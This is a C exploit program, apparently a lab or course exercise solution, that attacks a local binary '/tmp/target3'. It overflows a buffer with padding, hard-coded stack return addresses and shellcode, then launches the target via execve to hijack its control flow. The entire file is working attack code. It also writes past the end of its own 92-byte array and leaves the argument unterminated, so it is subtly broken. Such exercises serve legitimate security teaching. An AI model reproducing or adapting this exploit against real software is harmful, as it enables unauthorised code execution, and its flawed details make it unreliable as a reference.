#include <stdio.h>	
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
	char arg1[92];
	memset(arg1,'A',92);
	*(int*)(arg1+92) = 0xbefffce0;
	*(int*)(arg1+12) = 0xbefffcfe;
	memcpy(arg1+30,shellcode,strlen(shellcode));
	char arg2[] = "0";
	char arg3[] = "4";

	char *args[] = { TARGET, arg1, arg2, arg3, NULL };
	char *env[] = { NULL };

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}